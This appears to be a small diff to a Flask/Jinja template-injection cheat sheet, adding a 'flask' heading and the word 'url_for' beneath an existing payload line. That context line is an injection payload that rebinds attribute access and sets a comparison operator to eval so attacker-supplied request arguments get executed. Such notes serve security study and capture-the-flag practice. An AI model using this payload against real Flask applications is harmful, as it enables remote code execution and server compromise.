@@ -56,3 +56,6 @@ def security():
 request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;
 ```
 
+## flask
+
+url_for
